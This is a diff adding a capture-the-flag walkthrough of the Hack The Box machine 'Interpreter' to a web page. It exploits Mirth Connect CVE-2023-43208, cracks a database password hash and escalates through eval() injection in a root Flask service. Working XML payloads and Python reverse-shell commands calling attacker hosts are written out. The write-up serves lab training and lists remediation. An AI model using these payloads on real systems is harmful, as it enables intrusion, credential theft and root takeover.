@@ -34,6 +34,7 @@
   <script src="https://cdn.jsdelivr.net/npm/prismjs/components/prism-bash.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/prismjs/components/prism-cshtml.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/prismjs/components/prism-javascript.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs/components/prism-markup.min.js"></script>
 
 </head>
 
@@ -81,13 +82,320 @@
   <main class="challenge-main">
     <section aria-labelledby="overview-title" class="card section-overview">
       <header class="section-heading">
-        <p class="eyebrow">Disclaimer </p>
-        <h2 id="overview-title">Disclaimer</h2>
+        <p class="eyebrow">Summary </p>
+        <h2 id="overview-title">Machine Overview</h2>
+      </header>
+      <p>Interpreter is a medium-difficulty Linux machine on Hack The Box that focuses on exploiting a vulnerable Mirth Connect instance and analyzing insecure Python code. Initial access is obtained through a known Mirth Connect remote code execution vulnerability, while privilege escalation involves abusing an unsafe use of <code>eval()</code> within a custom Flask application running as root.</p>
+    </section>
+
+    <section aria-labelledby="description-title" class="card section-description">
+      <header class="section-heading">
+        <p class="eyebrow">Pentesting Process</p>
+        <h2 id="description-title">Service Enumeration</h2>
       </header>
       <p>
-        <strong>Due to Hack The Box rules, we cannot share write-ups or solutions for active machines. Write-ups will be
-          published once the machines are retired.</strong>
+        The assessment began with a comprehensive service enumeration using <strong>Nmap</strong> to identify
+        exposed services and their versions.
       </p>
+      <p class="center-code">
+        <code class="language-bash">nmap -sC -sV 10.129.7.73</code>
+      </p>
+      <p>
+        The scan identified three accessible services:
+      </p>
+      <p>
+      <pre class="terminal">
+              <code>
+Nmap scan report for 10.129.7.73
+Host is up (0.041s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE   VERSION
+22/tcp  open  ssh       OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+80/tcp  open  http
+443/tcp open  ssl/https
+            </code></pre>
+      </p>
+
+      <p>To simplify the assessment process, we mapped the target IP address to the domain name <strong>interpreter.htb</strong> by adding an entry to the <strong>/etc/hosts</strong> file.</p>
+
+      </p>
+      <header class="section-heading">
+        <h2 id="overview-title">Web Enumeration</h2>
+      </header>
+      <p>The web server hosts a Mirth Connect instance: </p>
+      <img src="./assets/mirth.png" width="80%"/>
+      <p>Downloading the JNLP launcher file exposes the version of the Mirth Connect instance.</p>
+      <p>
+  <code class="language-xml">&lt;application-desc main-class&equals;&quot;com&period;mirth&period;connect&period;client&period;ui&period;Mirth&quot;&gt;&NewLine;        &lt;argument&gt;https&colon;&sol;&sol;10&period;129&period;7&period;73&colon;443&lt;&sol;argument&gt;&NewLine;        &lt;argument&gt;4&period;4&period;0&lt;&sol;argument&gt;&NewLine;&lt;&sol;application-desc&gt;</code>
+      </p>
+      <p>The target is running <strong>Mirth Connect 4.4.0</strong> over HTTPS.</p>
+
+      <header class="section-heading">
+        <h2 id="overview-title">Initial Access</h2>
+      </header>
+      <p>Mirth Connect 4.4.0 is vulnerable to a remote code execution (RCE) vulnerability identified as <strong>CVE-2023–43208</strong>.</p>
+      
+      <p>A public proof-of-concept exploit is available and can be used to obtain initial access to the target system <a class="ref" href="#references">[1]</a>.</p>
+      <p>
+        <code class="language-bash">python CVE-2023-43208.py -u https://interpreter.htb -lh &lt;ATTACKER_IP&gt; -lp &lt;ATTACKER_PORT&gt;</code>
+      </p>
+      <img src="./assets/rev_shell.png" width="80%"/>
+
+      <p>The initial shell was upgraded to a fully interactive TTY using Python.</p>
+      <p>
+        <code class="language-bash">python3 -c 'import pty; pty.spawn("/bin/bash")'</code>
+      </p>
+      <img src="./assets/interactive_shell.png" width="80%"/>
+      
+      <header class="section-heading">
+        <h2 id="overview-title">Database Enumeration</h2>
+      </header>
+      <p>Following initial access, local enumeration revealed configuration files containing database connection details.</p>
+
+      <p>The file <code>/usr/local/mirthconnect/conf/mirth.properties</code> contains credentials for the backend MariaDB database.</p>
+      <p>
+        <code class="language-bash">cat /usr/local/mirthconnect/conf/mirth.properties</code>
+      </p>
+      <pre class="terminal">
+              <code>
+# options: derby, mysql, postgres, oracle, sqlserver
+database = mysql
+
+database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
+
+# database credentials
+database.username = mirthdb
+database.password = MirthPass123!
+              </code></pre>
+      <p>These credentials provide direct access to the Mirth database.</p>
+      <p>
+        <code class="language-bash">mysql -h 127.0.0.1 -u mirthdb -p'MirthPass123!' mc_bdd_prod</code>
+      </p>
+      <p>Database enumeration revealed the following user account:</p>
+      <p>
+        <code class="language-sql">select id, username from PERSON;</code>
+      </p>
+      <pre class="terminal">
+              <code>
++----+----------+
+| id | username |
++----+----------+
+|  2 | sedric   |
++----+----------+
+1 row in set (0.001 sec)</code>
+    </pre>
+    <p>Database enumeration revealed a user account named <strong>sedric</strong>. The corresponding password hash was extracted from the database.</p>
+    <p>
+      <code class="language-sql">select * from PERSON_PASSWORD;</code>
+    </p>
+    <pre class="terminal"><code>
++-----------+----------------------------------------------------------+---------------------+
+| PERSON_ID | PASSWORD                                                 | PASSWORD_DATE       |
++-----------+----------------------------------------------------------+---------------------+
+|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== | 2025-09-19 09:22:28 |
++-----------+----------------------------------------------------------+---------------------+
+1 row in set (0.001 sec)
+</code>
+    </pre>
+
+      <p>The extracted hash was then analyzed and prepared for offline cracking.</p>
+      <p>Mirth passwords are stored using a Base64-encoded salted <strong>PBKDF2WithHmacSHA256</strong> hash format. <a class="ref" href="#references">[2]</a></p>
+      <p><strong>Hashcat</strong> can crack these hashes. Before attempting to crack the hash, we first need to understand its structure.</p>
+      <p>The hash structure is as follows:</p>
+      <pre class="terminal"><code>
+<span style="color: red;">Hash</span> = <span style="color: rgb(31, 72, 255);">Base64(</span><span style="color: rgb(47, 145, 44);">Salt [8 bytes]</span> + <span style="color: rgb(207, 113, 6);">SHA256 hash [32 bytes]</span><span style="color: rgb(31, 72, 255);">)</span>
+          </code></pre>
+        <p>The hash was decoded to separate the embedded salt and digest values.</p>
+        <ul>
+          <li><strong>Salt</strong>
+            <ul>
+              <li><strong>Hex: </strong>bbff8b0413949da7</li>
+              <li><strong>Base64: </strong>u/+LBBOUnac=</li>
+            </ul>
+          </li>
+          <li><strong>SHA256 Hash</strong>
+            <ul>
+              <li><strong>Hex: </strong>62c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb</li>
+              <li><strong>Base64: </strong>YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=</li>
+            </ul>
+          </li>
+        </ul>
+        <p><strong>Hashcat</strong> expects the hash in the following format <a class="ref" href="#references">[3]</a>:</p>
+        <pre class="terminal"><code>
+<strong>sha256:</strong><span style="color: rgb(154, 7, 199);">&lt;iteration count&gt;</span><strong>:</strong><span style="color: rgb(47, 145, 44);">&lt;base64 salt&gt;</span><strong>:</strong><span style="color: rgb(207, 113, 6);">&lt;base64 digest&gt;</span>
+          </code></pre>
+      <p>The iteration count represents the number of times the hashing function is applied. The recommended value for PBKDF2WithHmacSHA256 is <strong>600,000</strong><a class="ref" href="#references">[4]</a>. This value was used during the Hashcat cracking process.</p>
+      <p>The hash was reformatted for Hashcat and cracked using the RockYou wordlist:</p>
+      <p>
+        <code class="language-bash">hashcat -m 10900 'sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=' /usr/share/wordlists/rockyou.txt</code>
+      </p>
+      <p>The password was successfully recovered as <strong>snowflake1</strong>.</p>
+      <p>The recovered credentials provided SSH access as the user <strong>sedric</strong>.</p>
+
+      <header class="section-heading">
+        <h2 id="overview-title">Post-Exploitation</h2>
+      </header>
+      <p>After obtaining SSH access, local enumeration was performed to identify privilege escalation opportunities.</p>
+      <header class="section-heading">
+        <h3 id="overview-title">Process Discovery</h3>
+      </header>
+      <p>Reviewing running processes revealed a custom Python application executing with root privileges.</p>
+      <p>
+        <code class="language-bash">ps -aux</code>
+      </p>
+      <pre class="terminal"><code>
+root        3550  0.0  0.8  39872 32144 ?        Ss   Feb27   0:08 /usr/bin/python3 /usr/local/bin/notif.py
+        </code></pre>
+
+      <p>The process corresponds to a Flask application listening on <code>127.0.0.1:54321</code> and running with root privileges. Since the service is only accessible locally, SSH port forwarding was used to access it for further analysis</p>
+      <p><code class="language-bash">ssh sedric@interpreter.htb -L 54321:127.0.0.1:54321</code></p>
+
+      <header class="section-heading">
+        <h3 id="overview-title">Python Application Analysis</h3>
+      </header>
+      <p>The application accepts XML patient records through the <code>/addPatient</code> endpoint and generates notifications, which are then written to a file on the system.</p>
+      <p>
+        <code class="language-python">@app.route("/addPatient", methods=["POST"])
+def receive():
+    if request.remote_addr != "127.0.0.1":
+        abort(403)
+    try:
+        xml_text = request.data.decode()
+        xml_root = ET.fromstring(xml_text)
+    except ET.ParseError:
+        return "XML ERROR\n", 400
+    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
+    if patient is None:
+        return "No <patient> tag found\n", 400
+    id = uuid.uuid4().hex
+    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
+    notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
+    path = os.path.join(USER_DIR,f"{id}.txt")
+    with open(path,"w") as f:
+        f.write(notification+"\n")
+    return notification</code>
+      </p>
+      <p>The application filters patients data using a regular expression.</p>
+      <p>
+        <code class="language-python">def template(first, last, sender, ts, dob, gender):
+    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
+    for s in [first, last, sender, ts, dob, gender]:
+        if not pattern.fullmatch(s):
+            return "[INVALID_INPUT]"
+    # DOB format is DD/MM/YYYY
+    try:
+        year_of_birth = int(dob.split('/')[-1])
+        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
+            return "[INVALID_DOB]"
+    except:
+        return "[INVALID_DOB]"
+    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
+    try:
+        return eval(f"f'''{template}'''")
+    except Exception as e:
+        return f"[EVAL_ERROR] {e}"</code>
+      </p>
+      <header class="section-heading">
+        <h3 id="overview-title">eval() Injection</h3>
+      </header>
+      <p>User-controlled data is embedded into a Python f-string that is evaluated using <code>eval()</code>.</p>
+
+      <p>Expressions enclosed within curly braces inside an f-string are evaluated as Python code. As a result, any injected Python expression enclosed within curly braces will be executed.</p>
+
+      <p>The application implements some restrictions on the input data. It uses a regular expression to validate the input.</p>
+      <p><code class="language-python">pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")</code></p>
+
+      <p>Although input validation is present, the restrictions can be bypassed by constructing disallowed characters dynamically during evaluation. For example, strings containing space character is not allowed. We can use <code>chr(32)</code> to replace the space character, and <code>eval()</code> will interpret the expression and replace it with an actual space character.</p>
+      <pre class="terminal"><code>
+'test 1234' --bypass_filter--> 'test'+chr(32)+'1234' --eval()--> 'test 1234'
+
+</code></pre>
+      <header class="section-heading">
+        <h3 id="overview-title">Privilege Escalation</h3>
+      </header>
+      <header class="section-heading">
+        <h4 id="overview-title">Command Execution</h4>
+      </header>
+      <p>We send the following xml data to the server in a POST request to the <code>/addPatient</code> endpoint:</p>
+      <p>
+        <code class="language-xml">&lt;patient&gt;&NewLine;  &lt;firstname&gt;ys4b&lt;&sol;firstname&gt;&NewLine;  &lt;lastname&gt;&lcub;&lowbar;&lowbar;import&lowbar;&lowbar;&lpar;&apos;os&apos;&rpar;&period;system&lpar;&apos;touch&apos;&plus;chr&lpar;32&rpar;&plus;&apos;&sol;tmp&sol;test1245&apos;&rpar;&rcub;&lt;&sol;lastname&gt;&NewLine;  &lt;sender&lowbar;app&gt;ys4b&lowbar;app&lt;&sol;sender&lowbar;app&gt;&NewLine;  &lt;timestamp&gt;20260101&lowbar;000000&lt;&sol;timestamp&gt;&NewLine;  &lt;birth&lowbar;date&gt;01&sol;01&sol;1912&lt;&sol;birth&lowbar;date&gt;&NewLine;  &lt;gender&gt;Male&lt;&sol;gender&gt;&NewLine;&lt;&sol;patient&gt;</code>
+      </p>
+      <p>This payload results in the execution of the command <code>__import__('os').system('touch /tmp/test1245')</code>, which creates the file <code>/tmp/test1245</code>.</p>
+      <p>The file was successfully created, confirming arbitrary command execution.</p>
+      <img src="assets/file_created.png" width="60%"/>
+
+      <header class="section-heading">
+        <h4 id="overview-title">Root Shell</h4>
+      </header>
+
+      <p>After confirming command execution, a reverse shell payload was prepared to obtain a root shell.</p>
+      <p>The payload is:</p>
+      <p>
+        <code class="language-bash">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;ATTACKER_IP&gt;",&lt;ATTACKER_PORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'</code>
+      </p>
+      <p>To create the file on the target machine, we reused the same technique as before. To bypass the filter, we encoded the payload in Base64.</p>
+      <p>
+        <code class="language-xml">&lt;patient&gt;&NewLine;  &lt;firstname&gt;ys4b&lt;&sol;firstname&gt;&NewLine;  &lt;lastname&gt;&lcub;&apos;echo&apos;&plus;chr&lpar;32&rpar;&plus;&apos;cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjY2Iiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiYmFzaCIpJw&equals;&equals;&apos;&plus;chr&lpar;124&rpar;&plus;&apos;base64&apos;&plus;chr&lpar;32&rpar;&plus;chr&lpar;45&rpar;&plus;&apos;d&apos;&plus;chr&lpar;62&rpar;&plus;&apos;&sol;tmp&sol;exploit&period;sh&apos;&rcub;&lt;&sol;lastname&gt;&NewLine;  &lt;sender&lowbar;app&gt;ys4b&lowbar;app&lt;&sol;sender&lowbar;app&gt;&NewLine;  &lt;timestamp&gt;20260101&lowbar;000000&lt;&sol;timestamp&gt;&NewLine;  &lt;birth&lowbar;date&gt;01&sol;01&sol;1912&lt;&sol;birth&lowbar;date&gt;&NewLine;  &lt;gender&gt;Male&lt;&sol;gender&gt;&NewLine;&lt;&sol;patient&gt;</code>
+      </p>
+      <p>The payload was successfully written to <code>/tmp/exploit.sh</code>.</p>
+      <p>To execute the script, we sent another POST request containing the following XML payload:</p>
+      <p>
+        <code class="language-xml">&lt;patient&gt;&NewLine;  &lt;firstname&gt;ys4b&lt;&sol;firstname&gt;&NewLine;  &lt;lastname&gt;&lcub;&lowbar;&lowbar;import&lowbar;&lowbar;&lpar;&apos;os&apos;&rpar;&period;system&lpar;&apos;&sol;bin&sol;bash&apos;&plus;chr&lpar;32&rpar;&plus;&apos;&sol;tmp&sol;exploit&period;sh&apos;&rpar;&rcub;&lt;&sol;lastname&gt;&NewLine;  &lt;sender&lowbar;app&gt;ys4b&lowbar;app&lt;&sol;sender&lowbar;app&gt;&NewLine;  &lt;timestamp&gt;20260101&lowbar;000000&lt;&sol;timestamp&gt;&NewLine;  &lt;birth&lowbar;date&gt;01&sol;01&sol;1912&lt;&sol;birth&lowbar;date&gt;&NewLine;  &lt;gender&gt;Male&lt;&sol;gender&gt;&NewLine;&lt;&sol;patient&gt;</code>
+      </p>
+      <p>Executing the payload resulted in a reverse shell running with root privileges.</p>
+      <img src="assets/root_shell.png" width="60%"/>
+    </section>
+
+      <section aria-labelledby="overview-title" class="card section-overview">
+      <header class="section-heading">
+        <p class="eyebrow">Mitigation</p>
+        <h2 id="overview-title">Remediation</h2>
+      </header>
+      <p>
+        The following remediation steps can help prevent exploitation of the identified vulnerabilities:
+      </p>
+      <ul>
+        <li>Upgrade the <strong>Mirth Connect</strong> instance to version <strong>4.4.1 or later</strong></li>
+        <li>Implement proper input validation and avoid the use of <code>eval()</code> on user-controlled data in the <code>notify.py</code> application.</li>
+      </ul>
+    </section>
+
+    <section aria-labelledby="overview-title" class="card section-overview" id="references">
+      <header class="section-heading">
+        <p class="eyebrow">References</p>
+        <h2 id="overview-title">References</h2>
+      </header>
+
+      <ol type="1" style="list-style-type: none; counter-reset: ref-counter;">
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">1</span>]</span>
+          <a href="https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT"
+            target="_blank" rel="noopener noreferrer">
+            GitHub | CVE-2023-43208 - Mirth Connect Remote Code Execution (RCE) Exploit </a>
+        </li>
+
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">2</span>]</span>
+          <a href="https://github.com/nextgenhealthcare/connect/wiki/4.4.0---Upgrade-Guide#default-digest-algorithm-changed"
+            target="_blank" rel="noopener noreferrer">
+             Mirth Connect GitHub | Mirth Default Digest Algorithm Changed</a>
+        </li>
+
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">3</span>]</span>
+          <a href="https://hashcat.net/forum/thread-7854.html"
+            target="_blank" rel="noopener noreferrer">
+             Hashcat | PBKDF2-SHA256 Expected Format</a>
+        </li>
+
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">4</span>]</span>
+          <a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html#pbkdf2"
+            target="_blank" rel="noopener noreferrer">
+             OWASP Cheat Sheet Series | PBKDF2-HMAC-SHA256 iterations count</a>
+        </li>
+
+      </ol>
     </section>
 
     <section aria-labelledby="overview-title" class="card section-overview" id="references">
